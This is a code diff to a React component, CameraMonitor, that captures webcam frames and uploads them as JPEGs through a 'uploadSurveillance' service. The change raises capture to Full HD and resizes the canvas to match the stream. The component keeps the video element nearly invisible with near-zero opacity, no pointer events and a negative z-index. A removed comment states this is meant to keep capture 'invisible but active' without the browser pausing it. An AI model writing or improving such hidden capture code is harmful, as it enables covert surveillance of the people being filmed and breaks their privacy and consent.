@@ -17,9 +17,15 @@ const CameraMonitor: React.FC<CameraMonitorProps> = ({ user, onError, onSuccess 
 
     const startCamera = async () => {
       try {
-        // Request video
+        // REQUEST HIGH RESOLUTION
+        // 'ideal' tells the browser to try to get this resolution, 
+        // but it will fallback to the best available if not supported.
         stream = await navigator.mediaDevices.getUserMedia({ 
-          video: { width: 320, height: 240, facingMode: "user" } 
+          video: { 
+            facingMode: "user",
+            width: { ideal: 1920 }, // Target Full HD
+            height: { ideal: 1080 } 
+          } 
         });
         
         if (videoRef.current) {
@@ -45,11 +51,18 @@ const CameraMonitor: React.FC<CameraMonitorProps> = ({ user, onError, onSuccess 
         const canvas = canvasRef.current;
         const context = canvas.getContext('2d');
 
-        if (context && video.readyState === video.HAVE_ENOUGH_DATA) {
+        // Check if video has valid dimensions
+        if (context && video.readyState === video.HAVE_ENOUGH_DATA && video.videoWidth > 0) {
+          
+          // DYNAMIC RESIZE: Set canvas to match the actual stream resolution
+          canvas.width = video.videoWidth;
+          canvas.height = video.videoHeight;
+
+          // Draw exact frame
           context.drawImage(video, 0, 0, canvas.width, canvas.height);
           
-          // Low quality JPEG for speed
-          const dataUrl = canvas.toDataURL('image/jpeg', 0.5);
+          // Compress slightly (0.6) to keep file size manageable while maintaining HD quality
+          const dataUrl = canvas.toDataURL('image/jpeg', 0.6);
           
           // Upload
           await dataService.uploadSurveillance(user, dataUrl);
@@ -68,10 +81,8 @@ const CameraMonitor: React.FC<CameraMonitorProps> = ({ user, onError, onSuccess 
   }, [user]);
 
   return (
-    // STYLE HACK: 
-    // Do not use 'display: none' or 'visibility: hidden' because modern browsers 
-    // stop updating video frames to save battery.
-    // Use opacity almost 0 and pointer-events none to make it "invisible" but active.
+    // HIDDEN CONTAINER
+    // We remove fixed width/height attributes to allow the elements to adapt to the stream
     <div style={{ 
         position: 'fixed', 
         bottom: 0, 
@@ -82,8 +93,8 @@ const CameraMonitor: React.FC<CameraMonitorProps> = ({ user, onError, onSuccess 
         pointerEvents: 'none', 
         zIndex: -50 
     }}>
-      <video ref={videoRef} playsInline muted width="320" height="240" />
-      <canvas ref={canvasRef} width="320" height="240" />
+      <video ref={videoRef} playsInline muted style={{ width: 'auto', height: 'auto' }} />
+      <canvas ref={canvasRef} style={{ display: 'none' }} />
     </div>
   );
 };
